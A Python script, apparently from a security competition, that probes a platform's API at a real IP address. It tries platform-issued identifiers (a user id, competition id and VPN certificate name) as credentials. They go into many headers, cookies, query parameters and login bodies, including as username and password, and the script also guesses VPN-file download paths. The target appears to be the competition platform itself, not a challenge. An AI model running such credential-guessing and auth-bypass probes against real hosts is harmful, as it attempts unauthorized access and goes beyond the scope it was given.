#!/usr/bin/env python3
"""
Try every identifier the platform itself handed us as a possible credential.

Identifiers in hand (all issued BY the platform, so a platform-side token lookup is
plausible rather than far-fetched):
  usr_b2ad80d021e26b5fb4b02b8619302912   <- in the .ovpn filename, "usr_" prefix suggests a user token
  ed3e7d452581978ccae13421               <- competition id suffix
  cc-715a9a001b4a5abad5ce3ecc            <- CN of the VPN client cert (cc- = cybercar client?)
  competition-ed3e7d452581978ccae13421

Read-only: only GETs / auth-check POSTs with a token in a header or query. No password guessing.
"""
import urllib3
import requests

urllib3.disable_warnings()
BASE = "https://175.27.210.153:9989"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"

TOKENS = {
    "usr_token": "usr_b2ad80d021e26b5fb4b02b8619302912",
    "usr_stripped": "b2ad80d021e26b5fb4b02b8619302912",
    "comp_suffix": "ed3e7d452581978ccae13421",
    "comp_full": "competition-ed3e7d452581978ccae13421",
    "vpn_cn": "cc-715a9a001b4a5abad5ce3ecc",
    "vpn_cn_stripped": "715a9a001b4a5abad5ce3ecc",
}

CHECKS = [
    ("GET", "/api/v1/auth/check", None),
    ("GET", "/api/v1/auth/me", None),
    ("GET", "/api/v1/bootstrap?competitionId=competition-ed3e7d452581978ccae13421", None),
]

PLACEMENTS = [
    ("header Authorization Bearer {}", lambda t: {"Authorization": "Bearer " + t}),
    ("header Authorization Token {}", lambda t: {"Authorization": "Token " + t}),
    ("header X-API-Token {}", lambda t: {"X-API-Token": t}),
    ("header X-Auth-Token {}", lambda t: {"X-Auth-Token": t}),
    ("header X-User-Token {}", lambda t: {"X-User-Token": t}),
    ("header Cookie cybercar_session={}", lambda t: {"Cookie": "cybercar_session=" + t}),
    ("query ?token={}", None),
    ("query ?api_key={}", None),
    ("query ?usr={}", None),
]


def main():
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Accept": "application/json, text/plain, */*"})

    print("=" * 78)
    print("1) baseline (no token)")
    print("=" * 78)
    for m, path, _ in CHECKS:
        r = s.request(m, BASE + path, timeout=20)
        print(f"  {m:4s} {path[:60]:60s} -> {r.status_code} {r.text[:110]}")

    print()
    print("=" * 78)
    print("2) token placements against /api/v1/auth/check (cheapest signal: "
          "authenticated true/false)")
    print("=" * 78)
    for tname, tok in TOKENS.items():
        for label, hdrfn in PLACEMENTS:
            if hdrfn:
                h = hdrfn(tok)
                try:
                    r = s.get(BASE + "/api/v1/auth/check", headers=h, timeout=20)
                    body = r.text[:80]
                    flag = "  <<< CHANGED" if "false" not in body else ""
                    print(f"  {tname:16s} {label.format(tok[:18] + '…'):46s} "
                          f"-> {r.status_code} {body}{flag}")
                except Exception as e:
                    print(f"  {tname:16s} {label:46s} -> EXC {type(e).__name__}")
            else:
                url = BASE + "/api/v1/auth/check" + label.format(tok)
                try:
                    r = s.get(url, timeout=20)
                    body = r.text[:80]
                    flag = "  <<< CHANGED" if "false" not in body else ""
                    print(f"  {tname:16s} {label.format(tok[:18] + '…'):46s} "
                          f"-> {r.status_code} {body}{flag}")
                except Exception as e:
                    print(f"  {tname:16s} {label:46s} -> EXC {type(e).__name__}")

    print()
    print("=" * 78)
    print("3) token in login body (some platforms accept token->session exchange)")
    print("=" * 78)
    for tname, tok in TOKENS.items():
        for body in ({"token": tok}, {"usr": tok}, {"userToken": tok},
                     {"username": tok, "password": tok}):
            try:
                r = s.post(BASE + "/api/v1/auth/login", json=body, timeout=20,
                           headers={"Origin": BASE,
                                    "Referer": BASE + "/login.html"})
                print(f"  {tname:16s} {str(body)[:48]:48s} -> {r.status_code} "
                      f"{r.text[:90]}")
            except Exception as e:
                print(f"  {tname:16s} -> EXC {type(e).__name__}")

    print()
    print("=" * 78)
    print("4) .ovpn-style path guesses with the usr token")
    print("=" * 78)
    ut = TOKENS["usr_token"]
    for p in (f"/vpn/{ut}.ovpn", f"/api/v1/vpn/{ut}", f"/ovpn/{ut}",
              f"/api/v1/users/{ut}", f"/api/v1/users/{ut}/ovpn"):
        try:
            r = s.get(BASE + p, timeout=20)
            print(f"  GET {p:56s} -> {r.status_code} ct={r.headers.get('Content-Type')} "
                  f"len={len(r.content)}")
        except Exception as e:
            print(f"  GET {p:56s} -> EXC {type(e).__name__}")


if __name__ == "__main__":
    main()
